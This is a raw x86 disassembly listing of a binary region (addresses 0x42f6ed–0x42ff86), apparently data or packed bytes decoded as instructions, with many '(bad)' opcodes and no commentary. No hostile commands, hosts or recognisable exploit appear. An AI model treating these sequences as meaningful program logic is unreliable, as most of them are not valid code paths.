  42f6ed:	xchg   esp,eax
  42f6ee:	sub    eax,0x95c07ff
  42f6f3:	dec    DWORD PTR [ecx]
  42f6f5:	push   ecx
  42f6f6:	or     BYTE PTR [esi],cl
  42f6f8:	jae    0x42f735
  42f6fa:	sbb    bl,bh
  42f6fc:	dec    esi
  42f6fd:	outs   dx,BYTE PTR ds:[esi]
  42f6fe:	and    bh,bh
  42f700:	xchg   esp,eax
  42f701:	dec    esi
  42f702:	sub    eax,0x265faaff
  42f707:	push   DWORD PTR [edx-0x3100cd77]
  42f70d:	sahf   
  42f70e:	ss (bad) 
  42f710:	fbstp  TBYTE PTR [edx-0x421d00c8]
  42f716:	inc    ecx
  42f717:	(bad)  
  42f718:	jmp    0xeb4240e7
  42f71d:	(bad)  
  42f71e:	dec    ecx
  42f71f:	jmp    edi
  42f721:	ret    0xff47
  42f724:	loop   0x42f6de
  42f726:	inc    edx
  42f727:	(bad)  
  42f728:	fisubr WORD PTR [esi-0x5f2500bd]
  42f72e:	inc    ebp
  42f72f:	call   ecx
  42f731:	xchg   ecx,eax
  42f732:	dec    ebx
  42f733:	dec    edx
  42f735:	or     BYTE PTR [edi+edi*8-0x3a],0x71
  42f73a:	dec    edx
  42f73b:	(bad)  
  42f73c:	mov    ecx,0x96ff3750
  42f741:	dec    edx
  42f742:	sub    bh,bh
  42f744:	push   esi
  42f745:	iret   
  42f746:	mov    edi,edi
  42f748:	dec    ecx
  42f749:	aam    0x88
  42f74b:	call   FWORD PTR [edi]
  42f74d:	mov    bl,0x49
  42f74f:	call   FWORD PTR [ecx]
  42f751:	outs   dx,BYTE PTR ds:[esi]
  42f752:	pop    ss
  42f753:	call   FWORD PTR [esi]
  42f755:	pusha  
  42f756:	adc    cl,BYTE PTR [esi]
  42f758:	imul   ecx,DWORD PTR [ecx+0x1b],0xffffffe5
  42f75c:	cmp    eax,0xa8ff1e83
  42f761:	inc    ebx
  42f762:	es (bad) 
  42f764:	mov    esp,0xbcff2466
  42f769:	mov    ?,WORD PTR [edi+edi*8]
  42f76c:	int3   
  42f76d:	mov    eax,ds:0xd4eeff33
  42f772:	dec    edi
  42f773:	push   ebp
  42f775:	loop   0x42f7d2
  42f777:	push   esp
  42f779:	jecxz  0x42f7dc
  42f77b:	push   esp
  42f77d:	loop   0x42f7e0
  42f77f:	push   edx
  42f781:	fcom   QWORD PTR [edi-0x1]
  42f784:	in     eax,dx
  42f785:	iret   
  42f786:	dec    edi
  42f787:	jmp    ebp
  42f789:	ror    BYTE PTR [ebx-0x1],0xdf
  42f78d:	scas   eax,DWORD PTR es:[edi]
  42f78e:	dec    ecx
  42f78f:	call   esi
  42f791:	popf   
  42f792:	dec    edi
  42f793:	dec    esi
  42f795:	lea    edx,[ecx-0x1]
  42f798:	retf   0x507e
  42f79b:	(bad)  
  42f79c:	mov    ebx,0x9bff3d5e
  42f7a1:	dec    edi
  42f7a2:	das    
  42f7a3:	call   DWORD PTR [eax-0x34]
  42f7a6:	mov    edi,edi
  42f7a8:	cmp    ah,cl
  42f7aa:	cmp    bh,0x23
  42f7ad:	retf   0xff5f
  42f7b0:	cmp    BYTE PTR [eax+ebp*1+0x1e6d44fb],al
  42f7b7:	or     edi,DWORD PTR [ebx+0x49]
  42f7ba:	and    BYTE PTR [ebx+eiz*1+0x74ff1ba1],dh
  42f7c1:	jae    0x42f7ea
  42f7c3:	dec    DWORD PTR [ebx+edi*2-0x4e8900d6]
  42f7ca:	cmp    al,0xff
  42f7cc:	int3   
  42f7cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f7ce:	cmp    al,0xff
  42f7d0:	in     eax,0xc9
  42f7d2:	inc    edi
  42f7d3:	(bad)  
  42f7d4:	sti    
  42f7d5:	cmc    
  42f7d6:	jl     0x42f7d7
  42f7d8:	(bad)  
  42f7d9:	test   DWORD PTR [ebx-0x7c0a0201],0x74f0fcff
  42f7e3:	push   esi
  42f7e5:	in     al,0x61
  42f7e7:	(bad)  
  42f7e8:	out    dx,al
  42f7e9:	rcl    DWORD PTR [edi+edi*8-0x1c],1
  42f7ed:	mov    esi,0xa9daff4f
  42f7f2:	push   esp
  42f7f3:	call   ecx
  42f7f5:	xchg   edi,eax
  42f7f6:	push   edi
  42f7f7:	dec    edx
  42f7f9:	xchg   BYTE PTR [ebp-0x1],dl
  42f7fc:	shr    DWORD PTR [esi+0x47],0xff
  42f800:	pushf  
  42f801:	cmp    esp,DWORD PTR [edi+edi*8]
  42f804:	data16 scas al,BYTE PTR es:[edi]
  42f806:	ins    DWORD PTR es:[edi],dx
  42f807:	push   DWORD PTR [esp+ecx*8]
  42f80a:	cmp    edi,0xff61c71f
  42f810:	dec    esi
  42f811:	jl     0x42f842
  42f813:	ret    0x605f
  42f816:	and    BYTE PTR [ebx],al
  42f818:	mov    WORD PTR [eax+ebp*1+0x57],es
  42f81c:	pop    ds
  42f81d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f81e:	sbb    edi,edi
  42f820:	bsr    ebx,DWORD PTR [edi+edi*8]
  42f824:	sbb    ch,BYTE PTR [ecx-0x34e600e5]
  42f82a:	sub    al,0xff
  42f82c:	jl     0x42f810
  42f82e:	push   0x63e3f6ff
  42f833:	(bad)  
  42f834:	cld    
  42f835:	div    DWORD PTR [edx-0x1]
  42f838:	(bad)  
  42f839:	(bad)  
  42f83a:	mov    ebx,0xbffeffff
  42f83f:	(bad)  
  42f840:	(bad)  
  42f841:	cld    
  42f842:	pushf  
  42f843:	(bad)  
  42f844:	(bad)  
  42f845:	bnd js 0x42f847
  42f848:	hlt    
  42f849:	loopne 0x42f8ad
  42f84b:	(bad)  
  42f84c:	call   0xdd425219
  42f851:	mov    al,0x59
  42f853:	call   esp
  42f855:	pushf  
  42f856:	pop    ebp
  42f857:	dec    esp
  42f859:	mov    WORD PTR [edi-0x1],ss
  42f85c:	(bad)  
  42f85d:	jne    0x42f8ab
  42f85f:	jmp    DWORD PTR [ebx+0x7aff253a]
  42f865:	scas   al,BYTE PTR es:[edi]
  42f866:	imul   edi,edi,0x47
  42f869:	jmp    0xff61:0xc020ffa3
  42f870:	pop    eax
  42f871:	fs bound eax,QWORD PTR es:[eax]
  42f875:	add    BYTE PTR [eax],al
  42f877:	add    BYTE PTR [edi+0x48],bh
  42f87a:	and    eax,0x1a893114
  42f87f:	test   DWORD PTR [esi],0x1fff24cb
  42f885:	mov    edx,0xcd30ff25
  42f88a:	cmp    edi,edi
  42f88c:	dec    edx
  42f88d:	icebp  
  42f88e:	cdq    
  42f88f:	(bad)  
  42f890:	mov    ecx,0xffffd1fb
  42f895:	call   FWORD PTR [edx-0x55020001]
  42f89b:	(bad)  
  42f89c:	cli    
  42f89d:	stc    
  42f89e:	fdivp  st(7),st
  42f8a0:	(bad)  
  42f8a1:	std    
  42f8a2:	sar    bh,0xfd
  42f8a5:	cmc    
  42f8a6:	mov    bh,bh
  42f8a8:	clc    
  42f8a9:	out    0x69,al
  42f8ab:	(bad)  
  42f8ac:	jmp    0x5db4:0xdfff60cd
  42f8b3:	call   esp
  42f8b5:	mov    al,ds:0x8fcfff60
  42f8ba:	pop    edx
  42f8bb:	jmp    FWORD PTR [esi-0x7300c4a2]
  42f8c1:	fs cmp edi,edi
  42f8c4:	xchg   esi,eax
  42f8c5:	xchg   BYTE PTR [eax-0x1],bl
  42f8c8:	gs (bad) 
  42f8ca:	mov    bh,bh
  42f8cc:	push   ebx
  42f8cd:	ja     0x42f90e
  42f8cf:	icebp  
  42f8d0:	jb     0x42f916
  42f8d2:	sbb    ebx,DWORD PTR [esi]
	...
  42f8dc:	push   eax
  42f8dd:	outs   dx,DWORD PTR ds:[esi]
  42f8de:	sbb    eax,0x27c71d7a
  42f8e3:	call   FWORD PTR [esi]
  42f8e5:	iret   
  42f8e6:	cmp    edi,edi
  42f8e8:	xor    ebp,edx
  42f8ea:	dec    esi
  42f8eb:	push   DWORD PTR [esi+eiz*8-0x66]
  42f8ef:	call   eax
  42f8f1:	clc    
  42f8f2:	clc    
  42f8f3:	jmp    edx
  42f8f5:	(bad)  
  42f8f6:	(bad)  
  42f8f7:	(bad)  
  42f8f8:	sti    
  42f8f9:	sti    
  42f8fa:	(bad)  
  42f8fc:	lock in eax,dx
  42f8fe:	mov    esi,0xade5e8ff
  42f903:	push   eax
  42f905:	out    0x83,eax
  42f907:	(bad)  
  42f908:	stc    
  42f909:	out    0x6e,al
  42f90b:	(bad)  
  42f90c:	jmp    0x42f8db
  42f90e:	fs (bad) 
  42f910:	fbstp  TBYTE PTR [ebp-0x5c2b009d]
  42f916:	arpl   di,di
  42f918:	iret   
  42f919:	nop
  42f91a:	pop    ebp
  42f91b:	push   DWORD PTR [ecx+0x7fff395b]
  42f921:	sar    BYTE PTR [edx-0x1],0x99
  42f925:	jae    0x42f975
  42f927:	call   DWORD PTR [ecx+esi*1+0x2c8eff22]
  42f92e:	sbb    al,0x69
	...
  42f93c:	jnp    0x42f9a9
  42f93e:	xor    eax,DWORD PTR [esi]
  42f940:	push   esp
  42f941:	sahf   
  42f942:	lds    ebx,FWORD PTR cs:[ecx+edi*4]
  42f946:	xor    edi,edi
  42f948:	and    al,cl
  42f94a:	inc    DWORD PTR ds:[ecx-0x15007c28]
  42f951:	out    dx,eax
  42f952:	out    0xff,eax
  42f954:	into   
  42f955:	cld    
  42f956:	clc    
  42f957:	(bad)  
  42f958:	jmp    0xd9f3:0xecfff8fb
  42f95f:	(bad)  
  42f960:	(bad)  
  42f962:	stos   BYTE PTR es:[edi],al
  42f963:	(bad)  
  42f964:	jmp    0x42f947
  42f966:	je     0x42f967
  42f968:	sti    
  42f969:	jmp    0xff65:0xcbecff6c
  42f970:	fidiv  WORD PTR [edx-0x632e009a]
  42f976:	(bad)  
  42f977:	(bad)  
  42f978:	mov    ebp,0xa6ff4c7a
  42f97d:	dec    edi
  42f97e:	xor    edi,edi
  42f980:	mov    BYTE PTR [ecx-0x6a7d0097],ch
  42f986:	push   edi
  42f987:	dec    DWORD PTR [ebx+0xc42849]
	...
  42f99d:	add    BYTE PTR [eax],al
  42f99f:	add    BYTE PTR [ecx+0x70],bh
  42f9a2:	xor    ebp,DWORD PTR [esi]
  42f9a4:	dec    ebx
  42f9a5:	sahf   
  42f9a6:	das    
  42f9a7:	loope  0x42f9cc
  42f9a9:	mov    edi,0xcf29ff34
  42f9ae:	pop    ebp
  42f9af:	jmp    FWORD PTR [eax-0x28006324]
  42f9b5:	call   0xfc00f97c
  42f9ba:	out    dx,eax
  42f9bb:	call   ebx
  42f9bd:	clc    
  42f9be:	out    0xff,eax
  42f9c0:	(bad)  
  42f9c1:	(bad)  
  42f9c2:	ja     0x42f9c3
  42f9c4:	loope  0x42f98d
  42f9c6:	dec    esi
  42f9c7:	jmp    ebp
  42f9c9:	int    0x5a
  42f9cb:	jmp    edi
  42f9cd:	retf   0xff61
  42f9d0:	loopne 0x42f987
  42f9d2:	arpl   di,di
  42f9d4:	les    ecx,FWORD PTR [ebx+0x76b1ff54]
  42f9da:	dec    esp
  42f9db:	jmp    FWORD PTR [ebx+0x53ff4e81]
  42f9e1:	leave  
  42f9e2:	dec    WORD PTR [edi-0x47]
  42f9e6:	pop    ebp
  42f9e7:	jecxz  0x42fa66
  42f9e9:	push   edi
  42f9ea:	sub    al,0x2a
	...
  42fa04:	je     0x42f98b
  42fa06:	cmp    BYTE PTR [esi],ch
  42fa08:	push   edx
  42fa09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fa0a:	xor    ecx,eax
  42fa0c:	xor    ebx,eax
  42fa0e:	inc    esi
  42fa0f:	jmp    DWORD PTR [edx-0x2600b452]
  42fa15:	lods   al,BYTE PTR ds:[esi]
  42fa16:	dec    ebx
  42fa17:	push   DWORD PTR [edx-0x35005625]
  42fa1d:	retf   
  42fa1e:	cmp    edi,0xffffffc3
  42fa21:	popf   
  42fa22:	cmp    bh,bh
  42fa24:	(bad)  
  42fa25:	mov    bh,0x70
  42fa27:	(bad)  
  42fa28:	mov    esp,0xc0ff4a93
  42fa2d:	xchg   ebp,eax
  42fa2e:	inc    ecx
  42fa2f:	call   ebp
  42fa31:	mov    cl,0x5f
  42fa33:	dec    eax
  42fa35:	xchg   esp,eax
  42fa36:	push   edx
  42fa37:	(bad)  
  42fa38:	mov    edx,0xaeff568e
  42fa3d:	test   BYTE PTR [eax-0x1],dl
  42fa40:	outs   dx,BYTE PTR ds:[esi]
  42fa41:	xchg   ecx,eax
  42fa42:	inc    esi
  42fa43:	leave  
  42fa44:	data16 jb 0x42fa7c
  42fa47:	sub    al,BYTE PTR [eax]
	...
  42fa65:	add    BYTE PTR [eax],al
  42fa67:	add    BYTE PTR [ebx-0x6c],dh
  42fa6a:	cmp    ecx,DWORD PTR [edi]
  42fa6c:	pop    ecx
  42fa6d:	scas   al,BYTE PTR es:[edi]
  42fa6e:	aas    
  42fa6f:	jle    0x42fadd
  42fa71:	test   eax,0xb36ffb48
  42fa76:	push   esp
  42fa77:	(bad)  
  42fa78:	jg     0x42fa3b
  42fa7a:	imul   edi,edi,0xffffff8f
  42fa7d:	ror    DWORD PTR [ebx+0x58a9c3ff],cl
  42fa83:	(bad)  
  42fa84:	fsub   st(2),st
  42fa86:	fcos   
  42fa88:	(bad)  
  42fa8a:	mov    edx,0x4788b2ff
  42fa8f:	inc    ecx
  42fa91:	lahf   
  42fa92:	pop    ebx
  42fa93:	(bad)  
  42fa94:	mov    esi,0xb1ff4c89
  42fa99:	pushf  
  42fa9a:	pusha  
  42fa9b:	hlt    
  42fa9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa9d:	xchg   BYTE PTR [ebx+eax*4-0x6f],cl
  42faa1:	jns    0x42fae5
  42faa3:	or     eax,0x0
	...
  42fad0:	pop    ebx
  42fad1:	stos   BYTE PTR es:[edi],al
  42fad2:	inc    esp
  42fad3:	sbb    edi,DWORD PTR [eax-0x5a]
  42fad6:	pop    edi
  42fad7:	jne    0x42fa6c
  42fad9:	mov    ecx,0xaaa0d983
  42fade:	ins    DWORD PTR es:[edi],dx
  42fadf:	cmc    
  42fae0:	mov    ah,0xa1
  42fae2:	inc    sp
  42fae5:	rol    ah,cl
  42fae7:	inc    edi
  42fae9:	ret    
  42faea:	lods   al,BYTE PTR ds:[esi]
  42faeb:	(bad)  
  42faec:	mov    eax,0xc5e24d83
  42faf1:	xchg   DWORD PTR [ecx-0x57],edx
  42faf4:	scas   al,BYTE PTR es:[edi]
  42faf5:	test   DWORD PTR [eax+0x5e],edx
  42faf8:	test   al,0xab
  42fafa:	outs   dx,BYTE PTR ds:[esi]
  42fafb:	sbb    DWORD PTR [eax],eax
	...
  42fb15:	add    BYTE PTR [eax],al
  42fb17:	add    al,bh
  42fb19:	add    BYTE PTR [ebx],al
  42fb1b:	add    al,dh
  42fb1d:	add    BYTE PTR [ecx],al
  42fb1f:	add    al,dh
  42fb21:	add    BYTE PTR [eax],al
  42fb23:	add    al,ah
  42fb25:	add    BYTE PTR [ecx],al
  42fb27:	add    al,al
  42fb29:	add    BYTE PTR [edi],al
  42fb2b:	add    al,al
  42fb2d:	add    BYTE PTR [edi],al
  42fb2f:	add    BYTE PTR [eax+0x300],al
  42fb35:	add    BYTE PTR [ecx],al
  42fb37:	add    BYTE PTR [eax],al
  42fb39:	add    BYTE PTR [ecx],al
  42fb3b:	add    BYTE PTR [eax],al
  42fb3d:	add    BYTE PTR [ecx],al
	...
  42fb57:	add    BYTE PTR [eax],al
  42fb59:	add    BYTE PTR [ecx],al
  42fb5b:	add    BYTE PTR [eax],al
  42fb5d:	add    BYTE PTR [ecx],al
  42fb5f:	add    BYTE PTR [eax-0x7ffffd00],al
  42fb65:	add    BYTE PTR [edi],al
  42fb67:	add    al,al
  42fb69:	add    BYTE PTR [edi],al
  42fb6b:	add    al,ah
  42fb6d:	add    BYTE PTR [edi],cl
  42fb6f:	add    al,dh
  42fb71:	add    BYTE PTR [edi],bl
  42fb73:	add    ah,bh
  42fb75:	add    BYTE PTR [edi+0x0],bh
  42fb78:	sub    BYTE PTR [eax],al
  42fb7a:	add    BYTE PTR [eax],al
  42fb7c:	adc    BYTE PTR [eax],al
  42fb7e:	add    BYTE PTR [eax],al
  42fb80:	and    BYTE PTR [eax],al
  42fb82:	add    BYTE PTR [eax],al
  42fb84:	add    DWORD PTR [eax],eax
  42fb86:	and    BYTE PTR [eax],al
  42fb88:	add    BYTE PTR [eax],al
  42fb8a:	add    BYTE PTR [eax],al
  42fb8c:	inc    eax
  42fb8d:	add    al,0x0
	...
  42fbe7:	add    BYTE PTR [esi+0x26],ch
  42fbea:	adc    al,0x3
  42fbec:	outs   dx,BYTE PTR ds:[esi]
  42fbed:	es adc al,0x13
  42fbf0:	jl     0x42fc1b
  42fbf2:	sbb    BYTE PTR [ebx+0x76],cl
  42fbf5:	ds sbb al,0xa1
  42fbf8:	inc    si
  42fbfa:	sbb    dl,ah
  42fbfc:	mov    DWORD PTR [esi+0x28],ebx
  42fbff:	cmc    
  42fc00:	mov    eax,ds:0x90cb283c
  42fc05:	xor    ah,BYTE PTR [ebx]
  42fc07:	mov    DWORD PTR [ebp+0x28],esi
  42fc0a:	push   ss
  42fc0b:	dec    ebx
  42fc0c:	outs   dx,BYTE PTR ds:[esi]
  42fc0d:	es adc al,0x18
  42fc10:	outs   dx,BYTE PTR ds:[esi]
  42fc11:	es adc al,0x4
	...
  42fc24:	outs   dx,BYTE PTR ds:[esi]
  42fc25:	es adc al,0x4
  42fc28:	jae    0x42fc51
  42fc2a:	adc    eax,0x23339b2f
  42fc2f:	call   0x784a:0xff2a3caf
  42fc36:	adc    bh,bh
  42fc38:	dec    eax
  42fc39:	mov    al,ds:0xbc3bff16
  42fc3e:	sbb    bh,bh
  42fc40:	test   BYTE PTR [edx+esi*1+0x468bbcff],ah
  42fc47:	inc    ecx
  42fc49:	test   BYTE PTR [ecx-0x3],cl
  42fc4c:	cdq    
  42fc4d:	inc    eax
  42fc4e:	daa    
  42fc4f:	lea    ebp,[esi+0x26]
  42fc52:	adc    al,0x35
  42fc54:	outs   dx,BYTE PTR ds:[esi]
  42fc55:	es adc al,0x7
	...
  42fc64:	jae    0x42fc8d
  42fc66:	adc    eax,0x2332a52d
  42fc6b:	mov    ecx,0xff2838af
  42fc70:	test   BYTE PTR [ebx+0x20],bl
  42fc73:	inc    DWORD PTR [ebp-0x5b]
  42fc76:	pop    ss
  42fc77:	call   DWORD PTR [ecx-0x46]
  42fc7a:	and    edi,edi
  42fc7c:	inc    edx
  42fc7d:	ret    
  42fc7e:	push   ds
  42fc7f:	inc    DWORD PTR [edi-0x39]
  42fc82:	push   ds
  42fc83:	jmp    FWORD PTR [eax-0x36]
  42fc86:	xor    edi,edi
  42fc88:	test   al,0x77
  42fc8a:	aas    
  42fc8b:	inc    esp
  42fc8d:	ins    BYTE PTR es:[edi],dx
  42fc8e:	inc    eax
  42fc8f:	jmp    FWORD PTR [ecx+0x6ea4314f]
  42fc95:	es adc al,0x35
  42fc98:	outs   dx,BYTE PTR ds:[esi]
  42fc99:	es adc al,0x2
  42fc9c:	add    BYTE PTR [eax],al
  42fc9e:	add    BYTE PTR [eax],al
  42fca0:	outs   dx,BYTE PTR ds:[esi]
  42fca1:	es adc al,0xd
  42fca4:	call   0x2838:0xb09e2030
  42fcab:	call   DWORD PTR [edx+0x2dff2857]
  42fcb1:	cdq    
  42fcb2:	add    edi,edi
  42fcb4:	aaa    
  42fcb5:	mov    dh,0x3
  42fcb7:	call   DWORD PTR [edi+eax*8+0x23]
  42fcbb:	jmp    DWORD PTR [esi-0x31]
  42fcbe:	xor    edi,edi
  42fcc0:	popa   
  42fcc1:	iret   
  42fcc2:	xor    al,0xff
  42fcc4:	dec    esi
  42fcc5:	(bad)  
  42fcc6:	xor    al,0xff
  42fcc8:	mov    ds:0xceff3a67,eax
  42fccd:	lahf   
  42fcce:	pop    ecx
  42fccf:	dec    ecx
  42fcd1:	jo     0x42fd18
  42fcd3:	dec    DWORD PTR [ebp+0x6e822035]
  42fcd9:	es adc al,0x18
  42fcdc:	add    BYTE PTR [eax],al
  42fcde:	add    BYTE PTR [eax],al
  42fce0:	jle    0x42fd0c
  42fce2:	sbb    BYTE PTR [ecx-0x4b],cl
  42fce5:	ss sub bh,bh
  42fce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fce9:	cmp    eax,0xa34aff28
  42fcee:	and    bh,bh
  42fcf0:	push   eax
  42fcf1:	mov    edi,0xcc67ff0d
  42fcf6:	cmp    edi,edi
  42fcf8:	push   0x6dff3dd1
  42fcfd:	(bad)  [ebp-0x1]
  42fd00:	cdq    
  42fd01:	lods   eax,DWORD PTR ds:[esi]
  42fd02:	pop    esp
  42fd03:	inc    ebp
  42fd05:	jno    0x42fd49
  42fd07:	(bad)  
  42fd08:	mov    edi,0xd1ff4575
  42fd0d:	xchg   ebx,eax
  42fd0e:	push   esp
  42fd0f:	call   edi
  42fd11:	stos   BYTE PTR es:[edi],al
  42fd12:	pop    edi
  42fd13:	inc    edx
  42fd15:	addr16 inc ecx
  42fd17:	lock jae 0x42fd41
  42fd1a:	adc    eax,0x4a
  42fd1f:	add    BYTE PTR [ecx-0x4e6ae1d0],dl
  42fd25:	ss sub bh,bh
  42fd28:	stos   BYTE PTR es:[edi],al
  42fd29:	inc    esp
  42fd2a:	sub    al,0xff
  42fd2c:	stos   BYTE PTR es:[edi],al
  42fd2d:	push   ecx
  42fd2e:	xor    bh,bh
  42fd30:	push   ebx
  42fd31:	aam    0x37
  42fd33:	jmp    DWORD PTR [ebp-0x26]
  42fd36:	push   eax
  42fd37:	(bad)  
  42fd38:	jnp    0x42fd17
  42fd3a:	imul   edi,edi,0xff60ac9c
  42fd40:	shr    BYTE PTR [ecx+0x42],0xff
  42fd44:	ret    0x3c5d
  42fd47:	inc    ecx
  42fd49:	pop    edi
  42fd4a:	cmp    edi,edi
  42fd4c:	mov    edi,0xb1ff3f68
  42fd51:	jmp    FWORD PTR ds:[bp+0x3a60]
  42fd57:	dec    DWORD PTR [ecx+0x801d2d]
  42fd5d:	add    BYTE PTR [eax],al
  42fd5f:	add    BYTE PTR [edi+edx*2+0x18],dh
  42fd63:	out    0x91,al
  42fd65:	pusha  
  42fd66:	sub    eax,0x345cb1ff
  42fd6b:	jmp    FWORD PTR [edx-0x5a00d2a6]
  42fd71:	pop    esp
  42fd72:	sub    eax,0x2e5ba1ff
  42fd77:	jmp    DWORD PTR [edi-0x4100ce9f]
  42fd7d:	je     0x42fdba
  42fd7f:	dec    edx
  42fd81:	jl     0x42fdc9
  42fd83:	inc    esp
  42fd85:	imul   eax,DWORD PTR [edi+edi*8-0x47],0x5a
  42fd8a:	cmp    bh,bh
  42fd8c:	pop    ebx
  42fd8d:	call   0xff2e:0x8e62ff25
  42fd94:	cdq    
  42fd95:	pop    esi
  42fd96:	xor    bh,bh
  42fd98:	pushf  
  42fd99:	xor    al,0x23
  42fd9b:	mov    esi,0x0
  42fda0:	jne    0x42fe05
  42fda2:	push   ds
  42fda3:	cli    
  42fda4:	mov    ch,0x57
  42fda6:	ss (bad) 
  42fda8:	mov    esi,0xd3ff2e69
  42fdad:	mov    WORD PTR [eax],?
  42fdaf:	call   edi
  42fdb1:	mov    ds:0xabdeff3a,al
  42fdb6:	aas    
  42fdb7:	jmp    eax
  42fdb9:	scas   al,BYTE PTR es:[edi]
  42fdba:	aas    
  42fdbb:	(bad)  
  42fdbc:	fsub   QWORD PTR [ebp-0x6a2b00c1]
  42fdc2:	inc    ebp
  42fdc3:	dec    esp
  42fdc5:	or     DWORD PTR [edx-0x1],0xff4469c3
  42fdcc:	and    dl,cl
  42fdce:	inc    edi
  42fdcf:	call   DWORD PTR [esi]
  42fdd1:	mov    edx,0x9137ff31
  42fdd6:	push   ss
  42fdd7:	jmp    FWORD PTR [ecx+0xe32a41]
  42fddd:	add    BYTE PTR [eax],al
  42fddf:	add    BYTE PTR [edx-0x5c1cd9a0],al
  42fde5:	push   ebp
  42fde6:	xor    bh,bh
  42fde8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fde9:	pop    ebp
  42fdea:	jmp    DWORD PTR cs:[ebp-0x5700c599]
  42fdf1:	outs   dx,DWORD PTR ds:[esi]
  42fdf2:	dec    ecx
  42fdf3:	(bad)  
  42fdf4:	mov    esi,0xf0ff7a94
  42fdf9:	aam    0x5a
  42fdfb:	(bad)  
  42fdfc:	jmp    0xdf424bc6
  42fe01:	scas   al,BYTE PTR es:[edi]
  42fe02:	dec    eax
  42fe03:	call   edx
  42fe05:	xchg   ebp,eax
  42fe06:	push   eax
  42fe07:	inc    ebp
  42fe09:	jns    0x42fe58
  42fe0b:	inc    DWORD PTR [ebx-0x14]
  42fe0e:	mov    bh,bh
  42fe10:	xor    bl,bl
  42fe12:	pop    edi
  42fe13:	inc    DWORD PTR [ebx-0x69]
  42fe16:	sub    al,0xff
  42fe18:	mov    ds:0xbe2b44,al
  42fe1d:	add    BYTE PTR [eax],al
  42fe1f:	add    BYTE PTR [eax+0x2e99214a],al
  42fe25:	cdq    
  42fe26:	add    bh,bh
  42fe28:	dec    esp
  42fe29:	test   al,0x1f
  42fe2b:	jmp    FWORD PTR [ecx-0x32]
  42fe2e:	aas    
  42fe2f:	dec    DWORD PTR [ebp-0xe005f0f]
  42fe35:	jmp    0xa50afe1f
  42fe3a:	mov    edi,edi
  42fe3c:	jmp    0xe2425f0f
  42fe41:	mov    edx,0xa4d7ff52
  42fe46:	pop    ecx
  42fe47:	inc    ebp
  42fe49:	adc    BYTE PTR [ecx-0x1],0x3c
  42fe4d:	jecxz  0x42fecd
  42fe4f:	(bad)  
  42fe50:	cmp    esp,esi
  42fe52:	je     0x42fe53
  42fe54:	jae    0x42fdd9
  42fe56:	xor    eax,0x1f348aff
  42fe5b:	jge    0x42fe5d
  42fe5d:	add    BYTE PTR [eax],al
  42fe5f:	add    BYTE PTR [ecx+esi*1+0x1c],bh
  42fe63:	inc    eax
  42fe64:	imul   eax,DWORD PTR [ebx-0x36a501d9],0x2b
  42fe6b:	call   FWORD PTR [ebx-0x22]
  42fe6e:	arpl   di,di
  42fe70:	(bad)
  42fe73:	jmp    ecx
  42fe75:	(bad)  
  42fe76:	idiv   bh
  42fe78:	jmp    0xe742d85e
  42fe7d:	fisttp QWORD PTR [ebx+0x5dc4e5ff]
  42fe83:	(bad)  
  42fe84:	fisubr DWORD PTR [edx-0x723300a0]
  42fe8a:	pop    edx
  42fe8b:	call   FWORD PTR [edi-0x17]
  42fe8e:	mov    edi,edi
  42fe90:	inc    esp
  42fe91:	jmp    0x59cffe1a
  42fe96:	sub    esp,edi
  42fe98:	jno    0x42fec1
  42fe9a:	adc    eax,0x44
  42fe9f:	add    BYTE PTR [eax],al
  42fea1:	add    BYTE PTR [eax],al
  42fea3:	add    BYTE PTR [edi+0x57903957],bl
  42fea9:	fwait
  42feaa:	sub    bh,bh
  42feac:	xor    ch,dl
  42feae:	cmp    bh,bh
  42feb0:	mov    edx,0xd7ffc8ec
  42feb5:	sti    
  42feb6:	icebp  
  42feb7:	(bad)  
  42feb8:	fcmovnb st,st(5)
  42feba:	mov    bh,0xff
  42febc:	shl    BYTE PTR [eax-0x3f1e009c],cl
  42fec2:	pusha  
  42fec3:	(bad)  
  42fec4:	fldcw  WORD PTR [ecx-0x7a38009d]
  42feca:	push   esi
  42fecb:	jmp    DWORD PTR [esi-0x6c008b54]
  42fed1:	jns    0x42ff1f
  42fed3:	std    
  42fed4:	sub    DWORD PTR [edi],0x266e761b
  42feda:	adc    al,0x13
	...
  42fee4:	leave  
  42fee5:	jg     0x42ff3a
  42fee7:	add    DWORD PTR [ebx+0x66b24771],ebp
  42feed:	mov    eax,ds:0xb97fff32
  42fef2:	pusha  
  42fef3:	jmp    FWORD PTR [edi-0x5f00885a]
  42fef9:	(bad)  
  42fefa:	mov    bh,bh
  42fefc:	les    ebx,FWORD PTR [eax-0x5f3200b0]
  42ff02:	push   esp
  42ff03:	call   ebp
  42ff05:	mov    ds:0x7dc2ff61,al
  42ff0a:	push   eax
  42ff0b:	push   DWORD PTR [eax-0x6d02a678]
  42ff11:	xor    esp,DWORD PTR [ecx]
  42ff13:	mov    ebp,DWORD PTR [esi+0x26]
  42ff16:	adc    al,0x2e
  42ff18:	outs   dx,BYTE PTR ds:[esi]
  42ff19:	es adc al,0x2
	...
  42ff24:	outs   dx,BYTE PTR ds:[esi]
  42ff25:	es adc al,0x3
  42ff28:	out    0xc9,eax
  42ff2a:	scas   eax,DWORD PTR es:[edi]
  42ff2b:	add    ah,BYTE PTR [eax-0x6576be9b]
  42ff31:	mov    DWORD PTR [eax-0x7],ecx
  42ff34:	sub    BYTE PTR [edx-0x427300a3],0x77
  42ff3b:	push   DWORD PTR [ecx-0x3f00935b]
  42ff41:	mov    BYTE PTR [edi-0x1],cl
  42ff44:	into   
  42ff45:	xchg   ecx,eax
  42ff46:	pop    ebx
  42ff47:	(bad)  
  42ff48:	mov    ebx,0x60e1456b
  42ff4d:	test   DWORD PTR ds:0x14266eac,esi
  42ff53:	sub    ebp,DWORD PTR [esi+0x26]
  42ff56:	adc    al,0x4
	...
  42ff70:	jg     0x42ffad
  42ff72:	and    edi,DWORD PTR [edi]
  42ff74:	pushf  
  42ff75:	pop    esi
  42ff76:	cmp    al,0x84
  42ff78:	mov    al,0x79
  42ff7a:	dec    esp
  42ff7b:	(bad)  
  42ff7c:	mov    ah,0x7c
  42ff7e:	dec    edi
  42ff7f:	out    0xaa,eax
  42ff81:	imul   eax,DWORD PTR [ebx-0x40],0xffffff8e
  42ff85:	inc    esi
  42ff86:	sub    bh,BYTE PTR [edi+0x73]
